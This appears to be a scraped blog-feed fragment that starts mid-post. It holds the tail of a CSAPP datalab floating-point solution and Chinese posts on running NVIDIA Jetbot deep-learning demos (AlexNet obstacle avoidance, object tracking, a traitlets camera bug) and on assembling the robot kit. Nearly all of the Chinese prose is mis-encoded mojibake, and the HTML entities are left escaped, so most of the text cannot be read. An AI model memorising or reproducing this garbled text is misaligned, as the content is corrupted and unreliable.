if (x \u0026gt;= 128) return 0x7f800000; // +INF if (x \u0026gt;= -126) return (x + 127) \u0026lt;\u0026lt; 23; // [-126,127]: 2^xä¸ºè§„æ ¼æ•°, f=1.0, e=x+127 if (x \u0026gt;= -150) return 1 \u0026lt;\u0026lt; (x + 150); // [-150,-125]: 2^xä¸ºéè§„æ ¼æ•°, f=2^(x+150), e=0 else return 0; // too small } å¤ªå²å…¬æ›°ï¼šå‰é¢å‡ ä¸ªè€ƒå¯Ÿintçš„é¢˜ç›®å±‚å±‚æ·±å…¥ï¼Œä»æ©ç æ€æƒ³åˆ°æ¡ä»¶åˆ¤æ–­ï¼Œæ¯ä¸ªæ–°é¢˜ç›®éƒ½å¯ä»¥ç”¨åˆ°å‰é¢é¢˜ç›®çš„æ€è·¯ã€‚åªæœ‰howManyBitséœ€è¦æƒ³åˆ°å¦‚ä½•ç”¨ç§»ä½æ„é€ è¿­ä»£ï¼Œæœ‰ä¸€å®šçš„éš¾åº¦ã€‚ç›¸æ¯”è€Œè¨€æœ€åçš„æµ®ç‚¹æ•°é¢˜ç›®ç”±äºæ”¾å¼€äº†è¯¸å¤šé™åˆ¶ï¼Œå˜æˆäº†ä¸€èˆ¬çš„ç¼–ç¨‹é¢˜ï¼Œåªéœ€è¦ç†Ÿç»ƒæŒæ¡æµ®ç‚¹æ•°è§„åˆ™å³å¯ä½œç­”ã€‚\n","date":"2020-01-21T00:00:03Z","permalink":"https://lonelyuan.github.io/p/csapp-datalab/","title":"CSAPP - Datalab"},{"content":"é‚£ä¸ªç”·å­©ä¸æƒ³ç©äººå·¥æ™ºèƒ½å‘¢ï¼Ÿåœ¨ç„å­¦ä¿®bugä¹‹åï¼Œæˆ‘ç»ˆäºè·‘é€šäº†jetbotè‡ªå¸¦çš„æ·±åº¦å­¦ä¹ demoã€‚\næ€æ ·æ‰èƒ½è®©aiç¨‹åºå‘æŒ¥å¥½çš„æ•ˆæœå‘¢ï¼Ÿä¼—æ‰€å‘¨çŸ¥ï¼Œæ‰€è°“äººå·¥æ™ºèƒ½ï¼Œæœ‰å¤šå°‘äººå·¥å°±æœ‰å¤šæ™ºèƒ½ã€‚\nAIçš„å‘å±•ç¦»ä¸å¼€ä¸‰ä¸ªè¦ç´ ï¼šç®—åŠ›ï¼Œç®—æ³•å’Œç®—æã€‚æ ¹æ®æ‘©å°”å®šå¾‹ï¼Œç®—åŠ›çš„å‘å±•æ˜¯ä¸ä¼šåœæ»çš„ï¼ˆè™½ç„¶å®šå¾‹å¿«å¤±æ•ˆäº†ï¼‰ï¼›è¿›å‡ å¹´æ¥çš„AIçƒ­æ­£æ˜¯ç®—æ³•çš„çªç ´ï¼Œå³æ·±åº¦å­¦ä¹ ç›¸å…³ç®—æ³•çš„çªé£çŒ›è¿›ï¼›è€Œç®—æå°±æ˜¯ç”¨æ¥è®­ç»ƒæ¨¡å‹çš„æ•°æ®ï¼Œæœªæ¥å‡ å¹´AIåº”ç”¨çš„è¿›ä¸€æ­¥è½åœ°ç¦»ä¸å¼€ç®—æçš„è¿›ä¸€æ­¥å¼€å‘ï¼ˆä¸­å›½åœ¨AIæ–¹é¢çš„æœ€å¤§ä¼˜åŠ¿æ­£åœ¨äºæ­¤ï¼‰ã€‚æ•°æ®é›†çš„ä¸°å¯Œç¨‹åº¦å’Œæœ‰æ•ˆç¨‹åº¦ç›´æ¥å½±å“äº†AIåº”ç”¨çš„æ•ˆæœï¼Œæˆ‘å°†åœ¨ä¸‹æ–‡è¯¦ç»†è¯´æ˜ã€‚\nåœ¨jetboté¡¹ç›®ä¸­ï¼Œæˆ‘ä»¬ä¹Ÿèƒ½ä½“éªŒåˆ°ç”¨â€œäººå·¥â€æ¢â€œæ™ºèƒ½â€çš„å¿«ä¹ã€‚ä½œä¸ºè§†è§‰è¯†åˆ«ç±»çš„AIåº”ç”¨ï¼Œæˆ‘ä»¬è¦åœ¨é¢„è®¾ç¯å¢ƒé‡Œåˆ›å»ºæ•°æ®é›†ï¼Œå¹¶ä¸ºå…¶æ ‡æ³¨ã€‚æœ‰äº†æ•°æ®é›†ï¼Œjetbotæ­è½½çš„NVIDIAç‰ŒGPUåœ¨æ–¹å¯¸ä¹‹é—´å°±èƒ½å®Œæˆæµ·é‡è®¡ç®—ï¼Œä»…ç”¨ä¸€é¢—æ‘„åƒå¤´å°±èƒ½å®ç°è‡ªåŠ¨é¿éšœï¼Œç›®æ ‡è¿½è¸ªï¼Œè‡ªåŠ¨å·¡çº¿ç­‰ç­‰ç‚«é…·åŠŸèƒ½ï¼ä¸è¦1999ï¼Œä¹Ÿä¸è¦999ï¼Œåªè¦99ï¼99åˆ€NVIDIAè®¡ç®—å¡å¸¦å›å®¶ï¼ï¼ˆå¦®ç»´é›…æ‰“é’±ï¼‰\nç»™èŒæ–°ç†æ¸…å‡ ä¸ªæ¦‚å¿µï¼š\näººå·¥æ™ºèƒ½ï¼Œæœºå™¨å­¦ä¹ ï¼Œæ·±åº¦å­¦ä¹ çš„å…³ç³»ï¼š\næ·±åº¦å­¦ä¹ ï¼šä¸€ç§å®ç°æœºå™¨å­¦ä¹ çš„æŠ€æœ¯ï¼›æœºå™¨å­¦ä¹ ï¼šä¸€ç§å®ç°äººå·¥æ™ºèƒ½çš„æ–¹æ³• ã€åŒ…å«å…³ç³»å›¾ã€‘ AIçš„å‘å±•è·¯å¾„ï¼š\nå¼±AIï¼šå•ç‹¬é¢†åŸŸå·¥ä½œæ•ˆç‡è¶…è¿‡äººç±»â†’ é€šç”¨AIï¼šå¯ä»¥å¹¿æ³›åº”ç”¨äºå¤§éƒ¨åˆ†é¢†åŸŸâ†’ å¼ºAIï¼šæœ‰è‡ªä¸»æ„è¯†ï¼Œå³å°†ç­ç»äººç±»ï¼ˆä¸æ˜¯ï¼‰â†’ ç°åœ¨AIå‘å±•åˆ°ä»€ä¹ˆåœ°æ­¥äº†ï¼šå¼±AIï¼Œæœ‰ç”Ÿä¹‹å¹´å¯èƒ½è§åˆ°é€šç”¨AI\næ¨èä¸€æ³¢æ±‰åŒ–çš„å¾ˆå¥½çš„wikiï¼Œä¹Ÿæœ‰è‡ªå·±åŸåˆ›çš„å†…å®¹ï¼šhttp://www.waveshare.net/wiki/JetBot_AI_Kit\næœ¬ç¯‡è¯¦ç»†ä»‹ç»ä¸¤ä¸ªdemoçš„ä»£ç å’Œå¯èƒ½é‡åˆ°çš„é—®é¢˜ï¼Œæœ€åé™„ä¸Šç¥ç»ç½‘ç»œçš„å…¥é—¨ç¬”è®°ã€‚åŒæ ·æ˜¯åˆæ¬¡æ¥è§¦ï¼Œå¤§ä½¬è¯·ç»•é“ã€‚\ndemo1ï¼šè‡ªåŠ¨é¿éšœ å°è½¦å¦‚ä½•å®ç°è‡ªåŠ¨é¿éšœçš„å‘¢ï¼Ÿç”¨é€šä¿—çš„ä¸èƒ½å†é€šä¿—çš„è¯´æ³•ï¼ŒAIç¨‹åºé€šè¿‡å­¦ä¹ ä½ ç»™ä»–çš„æ•°æ®é›†ï¼ŒçŸ¥é“äº†ä»€ä¹ˆæ ·çš„å›¾åƒæ˜¯æ­»è·¯ï¼Œä»€ä¹ˆæ ·çš„å›¾åƒæ˜¯é€šè·¯ã€‚å¾—åˆ°æ–°å›¾åƒæ—¶å°±èƒ½åˆ¤æ–­æ˜¯æ­»è·¯çš„æ¦‚ç‡æœ‰å¤šå°‘ï¼Œåœ¨ç¨‹åºé‡Œå¯ä»¥å¾ˆç®€å•çš„çœ‹å‡ºï¼Œå½“è¿™ä¸ªæ¦‚ç‡å¤§äº0.5çš„æ—¶å€™å°±è§¦å‘å°è½¦è½¬å‘ã€‚\nå…·ä½“è€Œè¨€ï¼Œä½ è¦åœ¨ä½ çš„ç¯å¢ƒé‡Œæ‹è‡³å°‘200å¼ ç…§ç‰‡ï¼Œ100å¼ æ ‡è®°ä¸ºé€šè·¯ï¼ˆfreeï¼‰ï¼Œ100å¼ æ ‡è®°ä¸ºæ­»è·¯ï¼ˆblockedï¼‰ã€‚è¿™ä¾¿æ˜¯ä½ çš„æ•°æ®é›†ï¼ˆdatasetï¼‰ã€‚æ„å»ºæ•°æ®é›†çš„æ—¶å€™å°½é‡åˆ†æ•£åœ¨ç¯å¢ƒçš„å„ä¸ªä½ç½®å’Œå„ä¸ªæ–¹å‘ï¼Œå¯ä»¥æ²¿è¾¹ç•Œç¯ç»•ä¸€åœˆï¼Œèµ°ä¸€æ®µè·ç¦»åœä¸‹ï¼Œè½¬ä¸€åœˆï¼Œæ”¶é›†8-10å¼ å›¾ç‰‡ã€‚åæ­£ä½ çš„æ•°æ®è¶Šå¤šï¼Œæ ‡è®°çš„è¶Šå‡†ç¡®ï¼Œæ¨¡å‹æ•ˆæœè¶Šå¥½ã€‚\nä¸‹ä¸€æ­¥å°±å¼€å§‹è®­ç»ƒæ¨¡å‹äº†ï¼Œä»ä»£ç é‡Œçœ‹å‡ºï¼Œè¿™ä¸ªdemoä½¿ç”¨AlexNetæ¨¡å‹ï¼Œç”¨pytorchå®ç°ï¼ˆåºŸè¯ï¼‰ã€‚ç¬¬ä¸€æ¬¡è¿è¡Œä½ ä¼šä¸‹è½½ä¸€ä¸ª244Må·¦å³çš„å¤§æ–‡ä»¶ï¼Œåœ¨/home/jetbot/.torch/modelsç›®å½•ä¸‹ä¼šçœ‹åˆ°è¿™ä¸ª.pthæ–‡ä»¶ã€‚è¿™ä¾¿æ˜¯AlexNetäº†ã€‚\nç»§ç»­è¿è¡Œç¨‹åºï¼Œå®Œæ•´çš„è¾“å‡ºç»“æœæœ‰ä¸‰åè¡Œï¼Œæ¯è¡Œåé¢çš„å°æ•°ä»£è¡¨å½“å‰æ¨¡å‹çš„å‡†ç¡®åº¦ï¼ˆï¼Ÿï¼‰ï¼Œç¨‹åºæœ€åä¼šä»è¿™30ä¸ªæ¨¡å‹ä¸­é€‰å–å‡†ç¡®åº¦æœ€é«˜çš„ä½œä¸ºæœ€ç»ˆæ¨¡å‹ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªpthæ–‡ä»¶ï¼šbest_model.pth\nä¸‹è½½æ–‡ä»¶å’Œè®­ç»ƒæ¨¡å‹éƒ½éœ€è¦èŠ±æŒºé•¿æ—¶é—´ï¼Œçœ‹åˆ°kernel busyï¼Œä¹Ÿå°±æ˜¯å³ä¸Šè§’çš„å¤§é»‘ç‚¹ä¸è¦è½»æ˜“æ‰“æ–­ã€‚\nä»€ä¹ˆæ˜¯æ¨¡å‹å‘¢ï¼Ÿç¨å¾®è§£é‡Šä¸€ä¸‹æœºå™¨å­¦ä¹ çš„æ¦‚å¿µã€‚\næ¨¡å‹å°±æ˜¯å‡½æ•°ï¼Œå…¶è¦ç´ ä¸ºè¾“å…¥ï¼Œè¾“å‡ºï¼Œå’Œå˜æ¢å…³ç³»ã€‚ä¸¾ä¾‹è¯´æ˜ï¼š\næ¨¡å‹ è¾“å…¥ è¾“å‡º ç»†èŒå‘å…»åˆ†ç§»åŠ¨ å¤–ç•Œç¯å¢ƒçš„åŒ–å­¦ä¿¡å· å‚¬åŠ¨é­æ¯›çš„ç”µä¿¡å· å­¦ç”Ÿå‚åŠ é«˜è€ƒ è¯•å·åå°„çš„å…‰ä¿¡å· è¯•å·ä¸Šé—®é¢˜çš„ç­”æ¡ˆ å°è½¦è‡ªåŠ¨é¿éšœ æ‘„åƒå¤´ä¼ è¾“å›¾åƒä¿¡å· å‰æ–¹è¢«å µå¡çš„æ¦‚ç‡ å®é™…ä¸Šï¼ŒçŸ¥è¯†çš„æœ¬è´¨ä¹Ÿæ˜¯å‡½æ•°ï¼Œç”Ÿå‘½å»¶ç»­çš„å…³é”®å°±åœ¨äºè¯¥ç”Ÿå‘½çš„æ¨¡å‹æ˜¯å¦é€‚åº”ç¯å¢ƒã€‚è¿™é‡Œä¸æ·±å…¥è§£é‡Šäº†ï¼Œè§‰å¾—æƒŠå¥‡è¯·å‚é˜…Yjangoçš„é¢‘é“https://space.bilibili.com/344849038ä»–ç”¨æœºå™¨å­¦ä¹ çš„è§’åº¦è§£é‡Šç”Ÿç‰©è¿›åŒ–ï¼Œéå¸¸é¢ è¦†ä¸‰è§‚ã€‚\næ€»ä¹‹è®­ç»ƒå‡ºæ¥çš„æ¨¡å‹å°±æ˜¯è¿™æ ·ä¸€ä¸ªå‡½æ•°ã€‚å…¶è¾“å…¥ä¸ºç»è¿‡å¤„ç†çš„æ‘„åƒå¤´çš„å›¾å½¢ä¿¡å·ï¼Œè¾“å‡ºä¸€ä¸ª0-1çš„æ•°ï¼Œè¶Šæ¥è¿‘1è¶Šæ„å‘³ç€æ¨¡å‹è®¤ä¸ºå°è½¦è¦æ’å¢™äº†ã€‚ä½†æ˜¯å½“ä»–å¤§äº0.5çš„æ—¶å€™å°±ä¼šè§¦å‘è½¬å‘ï¼Œä¹Ÿå°±å®ç°äº†è‡ªåŠ¨é¿éšœã€‚\nAlexNetæ˜¯2012å¹´æå‡ºçš„ä¸€ç§å·ç§¯ç¥ç»ç½‘ç»œï¼ˆå³CNNï¼‰ç®—æ³•ã€‚é¦–æ¬¡å®ç°gpuåŠ é€Ÿã€‚\nä¸»æµæ·±åº¦å­¦ä¹ æ¡†æ¶ï¼šTensorFlowï¼›PyTorchï¼›Keras\nè¿˜æŒºå¥½ç©çš„ğŸ˜€\ndemo2ï¼šç›®æ ‡è¿½è¸ª åŸºäºä¸Šä¸€ä¸ªdemoï¼Œæˆ‘ä»¬è¿˜è¦ä¸‹è½½ä¸€ä¸ªæ¨¡å‹ï¼Œcocoæ•°æ®é›†ç¥ç»ç½‘ç»œï¼Œå¯ä»¥æ£€æµ‹90ç§ä¸åŒçš„ç‰©ä½“ã€‚æŒ‰æ•™ç¨‹æŠŠ.engineæ–‡ä»¶ä¸‹è½½åˆ°æŒ‡å®šä½ç½®ï¼Œé¡ºç€è·‘å°±å®Œäº‹äº†ã€‚ï¼ˆå¼•å…¥æ¨¡å‹ä¹Ÿè¦èŠ±æŒºé•¿æ—¶é—´ï¼‰\nå¦‚æœæœ‰æ•°æ®é›†é‡Œçš„ç‰©å“ï¼Œä»è¾“å‡ºé‡Œèƒ½çœ‹åˆ°è“æ¡†æ ‡å‡ºï¼Œå°è½¦ä¼šè‡ªåŠ¨è½¬å‘ç‰©ä½“ï¼ŒåŒæ—¶è¿˜ä¿ç•™äº†è‡ªåŠ¨é¿éšœçš„ç¨‹åºã€‚\né‡åˆ°bugï¼šç¨‹åºä»…èƒ½è¯»å–ä¸€å¼ å›¾åƒè¿›è¡Œè¯†åˆ«ï¼Œæ‘„åƒå¤´æ›´æ–°çš„åŠŸèƒ½æ— æ³•æ‰§è¡Œã€‚\nä¿®bugï¼šæ‘„åƒå¤´é—®é¢˜ æè¿°ï¼šæ‘„åƒå¤´åªè¦è°ƒç”¨äº†ä¸€æ¬¡ï¼Œåé¢å°±æ— æ³•åœ¨å…¶ä»–åœ°æ–¹è°ƒç”¨ã€‚ç›´æ¥åœ¨jupyterä¸Šå…³é—­è¾“å‡ºå¹¶æ²¡æœ‰ä½œç”¨ã€‚è€Œä¸”åªè¦åœ¨ä¸€ä¸ªnotebooké‡Œå°±èƒ½é‡å¤è°ƒç”¨ï¼Œæ¢ä¸€ä¸ªå°±ä¸è¡Œã€‚è€Œä¸”å¹¶æ²¡æœ‰æŠ¥é”™ä¿¡æ¯ï¼Œç¨‹åºä¸€ç›´å¤„åœ¨busyçŠ¶æ€ã€‚\næ‰¾åˆ°æºç ï¼Œåœ¨jetbot/jetbot/camera.pyï¼Œä½†æ˜¯æ‰€æœ‰æ ·ä¾‹é‡Œé¢è°ƒç”¨æ‘„åƒå¤´éƒ½æ˜¯ç”¨çš„Camera.instance()æ–¹æ³•ï¼Œè€Œè¿™ä¸ªinstanceæ˜¯åœ¨traitletsåº“é‡Œçš„ï¼Œäºæ˜¯æ‰¾åˆ°trailetså®˜æ–¹æ–‡æ¡£\nTraitletsæ˜¯ä¸€ä¸ªçº¯ python åº“ï¼Œæ”¯æŒï¼š\nå¯¹ python å¯¹è±¡å±æ€§çš„å¼ºç±»å‹å®æ–½( ç±»å‹å±æ€§ç§°ä¸º \u0026ldquo;ç‰¹å¾\u0026rdquo; ) ï¼› åŠ¨æ€è®¡ç®—çš„é»˜è®¤å€¼ï¼› å½“å°è¯•æ”¹å˜æ—¶ï¼Œè‡ªåŠ¨éªŒè¯å’Œå¼ºåˆ¶ç‰¹å¾å±æ€§ï¼› å½“ç‰¹å¾å€¼æ”¹å˜æ—¶æ³¨å†Œæ¥æ”¶é€šçŸ¥ï¼› ä»æ–‡ä»¶æˆ–è€… å‘½ä»¤è¡Œ å‚æ•°ä¸­è¯»å–å€¼- åœ¨traitletsä¸Šä¸åŒå±‚ï¼Œå› è¿™é‡Œå¯ä»¥åœ¨æ²¡æœ‰é…ç½®æœºå™¨çš„æƒ…å†µä¸‹ä½¿ç”¨ traitletsã€‚ Traitletsæ”¯æŒIPythonå’ŒJupyterçš„é…ç½®ç³»ç»Ÿï¼Œä»¥åŠIPythonäº¤äº’å°éƒ¨ä»¶çš„å£°æ˜æ€§ APIã€‚\nipythonæ˜¯ä¸€ä¸ª python çš„äº¤äº’å¼ shellï¼Œæ¯”é»˜è®¤çš„python shell å¥½ç”¨å¾—å¤šï¼Œæ”¯æŒå˜é‡è‡ªåŠ¨è¡¥å…¨ï¼Œè‡ªåŠ¨ç¼©è¿›ï¼Œæ”¯æŒ bash shell å‘½ä»¤ï¼Œå†…ç½®äº†è®¸å¤šå¾ˆæœ‰ç”¨çš„åŠŸèƒ½å’Œå‡½æ•°ã€‚å…¶ä¸­å°±åŒ…æ‹¬traitletsåº“ã€‚\nhttps://traitlets.readthedocs.io/en/stable/config.html åœ¨è¿™é‡Œæ‰¾åˆ°instanceçš„åŠŸèƒ½ï¼šè¿”å›ç°æœ‰çš„ç±»ï¼Œå¦‚æœæ²¡æœ‰å°±æ–°å»ºä¸€ä¸ªã€‚\nä¸‹é¢æ˜¯æ ·ä¾‹ä¸­è°ƒç”¨æ‘„åƒå¤´çš„ä»£ç ï¼š\n1 2 3 4 5 6 7 8 import ipywidgets.widgets as widgets #å›¾åƒæ¨¡å— from IPython.display import display #ipyçš„æ˜¾ç¤ºæ¨¡å— import traitlets from jetbot import Camera, bgr8_to_jpeg #æ‘„åƒå¤´é©±åŠ¨ï¼Œå›¾åƒæ ¼å¼è½¬æ¢ camera = Camera.instance(width=500, height=500)#åˆå§‹åŒ–æ‘„åƒå¤´å¯¹è±¡ image = widgets.Image(format=\u0026#39;jpeg\u0026#39;, width=400, height=400)#åˆ›å»ºå›¾åƒ camera_link = traitlets.dlink((camera, \u0026#39;value\u0026#39;), (image, \u0026#39;value\u0026#39;), transform=bgr8_to_jpeg) #è¿æ¥æ‘„åƒå¤´åˆ°å›¾åƒ display(image) #æ˜¾ç¤ºå›¾åƒ å°è¯•ä»camera.pyé‡Œè°ƒç”¨åŸå§‹apiã€‚å¾—åˆ°æŠ¥é”™ï¼šEach object must be HasTraits, not \u0026lt;class 'NoneType'\u0026gt;ï¼Œæ˜¯è¯´å¿…é¡»ä¸ºå¯¹è±¡æŒ‡å®šç±»å‹ã€‚é‚£ä¹ˆHasTraitsè¿™ä¸ªç±»å‹æ˜¯å•¥ï¼Ÿæ–‡æ¡£è¯´:ä»»ä½•å…·æœ‰traitå±æ€§çš„ç±»éƒ½å¿…é¡»ä» HasTraits ç»§æ‰¿ã€‚\nå†æ¬¡æ¢³ç†è°ƒç”¨æ‘„åƒå¤´çš„æµç¨‹ï¼š\nå¼•å…¥æ¨¡å‹ï¼šmodel.load_state_dict(torch.load('best_model.pth')) è¿æ¥æ‘„åƒå¤´ï¼šè§ä¸Šæ–‡ æ¨¡å‹æ‰§è¡Œï¼š 1 2 3 4 def update(): ...#æ­¤å¤„ä¸ºæ¨¡å‹æ‰§è¡Œå‡½æ•°ï¼Œå°†è¾“å…¥å›¾åƒé¢„å¤„ç†åï¼Œæ‰§è¡Œæ¨¡å‹ update({\u0026#39;new\u0026#39;: camera.value}) #åˆå§‹åŒ–è¯¥å‡½æ•° camera.observe(update, names=\u0026#39;value\u0026#39;) #å°†updateå‡½æ•°è®¾ä¸ºcamera.valueçš„observer ç ”ç©¶ä¸€ä¸‹observeç”¨æ³•ï¼šå½“å¯¹è±¡å‘ç”Ÿå˜åŒ–æ—¶è°ƒç”¨å‡½æ•°ã€‚\nhttps://traitlets.readthedocs.io/en/stable/using_traitlets.html#validation\næ‰§è¡Œå¦‚ä¸‹ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 import ipywidgets.widgets as widgets #å›¾åƒæ¨¡å— from IPython.display import display #ipyçš„æ˜¾ç¤ºæ¨¡å— import traitlets from jetbot import Camera, bgr8_to_jpeg #æ‘„åƒå¤´é©±åŠ¨ï¼Œå›¾åƒæ ¼å¼è½¬æ¢ camera = Camera.instance(width=500, height=500)#åˆå§‹åŒ–æ‘„åƒå¤´å¯¹è±¡ def update(change): x = change[\u0026#39;new\u0026#39;] display(x) #æ˜¾ç¤ºå›¾åƒ update({\u0026#39;new\u0026#39;: camera.value}) camera.observe(update, names=\u0026#39;value\u0026#39;) è¾“å‡ºä¸€å¤§å †æ•°ç»„ï¼Œè¯´æ˜camera.valueæ˜¯è¿™ä¸€å¤§å †åƒç´ ã€‚è€Œä¸”observeæ­£å¸¸è¿è¡Œï¼Œæ•°æ®ä¸€ç›´å†’å‡ºã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 array([[[122, 116, 130], [126, 113, 127], [125, 117, 129], ..., [ 84, 96, 107], [ 82, 96, 113], [ 93, 93, 113]], [[120, 119, 130], [122, 120, 119], [118, 123, 130], ..., ç„¶è€Œå°±æ˜¯ä¸å®æ—¶æ›´æ–°æ•°æ®ï¼Œå’ã€‚\nğŸ‘´ä½›äº†ã€‚\n","date":"2019-10-01T00:26:38Z","permalink":"https://lonelyuan.github.io/p/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8jetbot%E6%99%BA%E8%83%BD%E5%B0%8F%E8%BD%A6%E5%B0%9D%E9%B2%9C%E4%BA%8C/","title":"æ·±åº¦å­¦ä¹ å…¥é—¨â€”â€”jetbotæ™ºèƒ½å°è½¦å°é²œï¼ˆäºŒï¼‰"},{"content":"é‚£ä¸ªç”·å­©ä¸æƒ³ç©æ ‘è“æ´¾å‘¢ï¼Ÿæœºç¼˜å·§åˆä¹‹ä¸‹ï¼Œæˆ‘å¾—åˆ°äº†ä¸€å°ä»·å€¼ä¸Šç™¾ç¾å…ƒçš„æ™ºèƒ½å°è½¦çš„ä½¿ç”¨æƒã€‚\nå°è½¦çš„æ ¸å¿ƒæ˜¯NVIDIAå®¶çš„jetson-nanoå¼€å‘æ¿ï¼Œè¿™æ¬¾19å¹´ä¸‰æœˆæ‰å‘å¸ƒçš„å¾®å‹AIè®¡ç®—æœºå¯è°“æ˜¯å¹³æ°‘çº§æ ¸å¼¹ï¼Œå››æ ¸A57çš„CPUï¼Œ128æ ¸å¿ƒMaxwellæ¶æ„çš„GPUï¼Œ4gå†…å­˜ï¼Œæ”¯æŒ4kè§†é¢‘è§£ç ï¼Œè€Œä¸”è¿™åªäº”è„ä¿±å…¨çš„éº»é›€åªéœ€è¦5Wçš„ç”µæºæ”¯æŒï¼Œä»»ä½•ä¸€æ”¯å……ç”µå®éƒ½å¯ä»¥èƒœä»»ã€‚è€Œå®ƒçš„å®šä½æ˜¯ç”¨å®ƒç®€å•çš„æ­å»ºäººå·¥æ™ºèƒ½åº”ç”¨ï¼Œéå¸¸çš„amazingã€‚\næœ¬æ–‡çš„ç›®çš„,ä¸å®Œå…¨æ˜¯æ–°æ‰‹æ•™ç¨‹,è¿˜æœ‰è‡ªå·±å­¦ä¹ è¿‡ç¨‹çš„è®°å½•å’Œåˆ†äº«.åˆæ¬¡æ¥è§¦,å¤šæœ‰ç–æ¼,æ¬¢è¿æŒ‡æ•™.\nã€å›¾ç‰‡ï¼šä¸»æ¿è¯ä»¶ç…§ã€‘\nç»™èŒæ–°ç†æ¸…å‡ ä¸ªæ¦‚å¿µï¼š\nå•ç‰‡æœºï¼šSingle-Chip Microcomputerã€‚\næ ‘è“æ´¾ï¼šä¸€æ¬¾è‘—åçš„å¾®å‹ç”µè„‘å“ç‰Œï¼ˆæœ¬æ–‡ä»‹ç»çš„jetson-nanoå¯ä»¥ç†è§£ä¸ºæ˜¯æ ‘è“æ´¾çš„ç«å“ï¼Œç›¸æ¯”æ ‘è“æ´¾ï¼Œè¿™æ¬¾å•ç‰‡æœºä»·æ ¼æ›´é«˜ï¼Œæ€§èƒ½æ›´å¥½ï¼Œä¸»æ‰“AIåº”ç”¨ï¼‰\njetbotï¼šä»¥jetson-nanoä¸ºå¹³å°æ­å»ºçš„aiæœºå™¨äººåº”ç”¨ï¼Œä¹Ÿå°±æ˜¯æ‰€è°“æ™ºèƒ½å°è½¦\nç¡¬ä»¶ç»„è£…:ç§¯æœ¨å’Œç”µå·¥ æœ¬äººæ‹¿åˆ°çš„æ˜¯é›¶ä»¶çŠ¶æ€çš„å°è½¦ï¼Œæ‰€ä»¥é¦–å…ˆè®²ä¸€è®²ç»„è£…çš„é—®é¢˜ã€‚æœ‰å…³å…·ä½“æ­¥éª¤ï¼Œå®˜ç½‘æ•™ç¨‹ååˆ†è¯¦ç»†ï¼Œè´´ä¸ªè¿æ¥ç»™æ‡’äººå§ï¼šhttps://www.ncnynl.com/archives/201904/2927.html\nè¿™é‡Œåªè®²ä¸€è®²æˆ‘ä½œä¸ºåˆå­¦è€…çš„ä¸€äº›ç†è§£ã€‚é¦–å…ˆï¼Œç©å•ç‰‡æœºå’Œç©ç§¯æœ¨çš„åŒºåˆ«å°±åœ¨äºç¼–ç¨‹ã€‚å½“ç„¶ï¼Œå…¥é—¨å•ç‰‡æœºè¿˜éœ€è¦å…¶ä»–æŠ€èƒ½ã€‚æ¯”å¦‚ï¼Œç”µå·¥æŠ€èƒ½ï¼šä½ éœ€è¦è¿›è¡Œçº¿æçš„ç®€å•åŠ å·¥ï¼Œå¼•è„šçš„ç„Šæ¥ï¼Œå‡†å¤‡åŸºæœ¬çš„å·¥å…·å°±å¥½ï¼Œæ¯•ç«Ÿé‚£ä¸ªç”·å­©æ²¡æœ‰ä¸€æ ¹çƒ­çƒ­çš„æ£’å­å‘¢ï¼ˆæŒ‡ç”µçƒ™é“ï¼‰ã€‚ç„¶åï¼Œå„ä¸ªéƒ¨ä»¶çš„æ‹¼æ¥å›ºå®šéœ€è¦ä¸€äº›åšæ‰‹å·¥çš„æŠ€å·§ï¼Œè¿™ä¸ªä¹Ÿä¸ç”¨æ€•ï¼Œèµ«é²æ™“å¤«æ›¾ç»è¯´è¿‡ï¼šçƒ­ç†”èƒ¶å¯ä»¥è®©æˆ‘ä»¬åˆ›é€ å¥‡è¿¹ã€‚\nåœ¨è¿™ä¸ªå±‚é¢ä¸Šï¼Œåˆå­¦è€…ä¼šæµªè´¹è®¸å¤šè€—æï¼Œè¿™æ˜¯å¿…è¦çš„ç»ƒä¹ æ‰‹æ®µï¼Œæ‰€ä»¥åˆå­¦è€…ä¹Ÿå¯ä»¥ä»æœ€ç®€å•çš„èŠ¯ç‰‡å…¥æ‰‹ã€‚åŒæ—¶ä½ è¿˜è¦å­¦ä¹ è¯Šæ–­ç¡¬ä»¶æ–¹é¢çš„é—®é¢˜ï¼Œä¸‡ç”¨è¡¨ä¼šå¾ˆæœ‰å¸®åŠ©ã€‚å…³äºæ›´è¯¦ç»†çš„å·¥å…·å’Œè€—æçš„éœ€è¦ï¼Œè¯·è‡ªè¡ŒæŸ¥é˜…å•ç‰‡æœºå…¥é—¨æœ‰å…³èµ„æ–™ã€‚\nåœ¨æœ¬é¡¹ç›®ä¸­ï¼Œç„Šæ¥å·¥ä½œå·²ç»å®Œæˆï¼Œå‰©ä¸‹çš„è¿æ¥éƒ½æ˜¯å¯æ’æ‹”å¼çš„ã€‚æˆ‘ä»¬åªéœ€è¦ä¸¤æŠŠèºä¸åˆ€å³å¯å®Œæˆç»„è£…ã€‚å³ä¾¿å¦‚æ­¤ï¼Œæœ¬äººè¿˜æ˜¯èŠ±äº†ä¸€æ™šä¸Šæ‰æŠŠå°è½¦ç‚¹äº®ï¼ŒåŸå› æ˜¯æˆ‘å¾—åˆ°çš„çº¿ææŸåè¿‘åŠï¼Œåªå¾—è‡ªå·±å¯»æ‰¾å’Œä¿®ç†ã€‚\nä¸‹é¢åˆ†æä¸€ä¸‹å°è½¦çš„ç»“æ„:\njetson-nanoå¼€å‘æ¿:å³æœ¬æœºçš„ä¸»æ¿,å¯ä»¥çœ‹åˆ°æœ‰ä¸¤å±‚èŠ¯ç‰‡,ä¸Šå±‚ä¸ºæ ¸å¿ƒå±‚,åŒ…æ‹¬cpu,gpuå’Œå†…å­˜å¯ä»¥åƒç¬”è®°æœ¬å†…å­˜æ¡ä¸€æ ·æ‹†å¸;ä¸‹å±‚ä¸ºä¸»æ¿,ç”¨äºè¿æ¥å„ç§è®¾å¤‡ intelæ— çº¿ç½‘å¡:å°†ä¸Šå±‚æ‹†ä¸‹å³å¯å®‰è£….ä»¤è¿å‡ºä¸¤æ ¹å¤©çº¿,ç¼ ç»•æœºèº«å³å¯. PiOLEDæ˜¾ç¤ºå™¨å’Œæ‹“å±•ç‰ˆ:è¿æ¥åœ¨I2Cä¸»çº¿ä¸Š ç›¸æœºæ¨¡å—:å®˜æ–¹æ ·ä¾‹å±•ç¤ºäº†åªç”¨ä¸€ä¸ªæ‘„åƒå¤´é€šè¿‡æ·±åº¦å­¦ä¹ è¿›è¡Œè‡ªåŠ¨é¿éšœçš„demo. 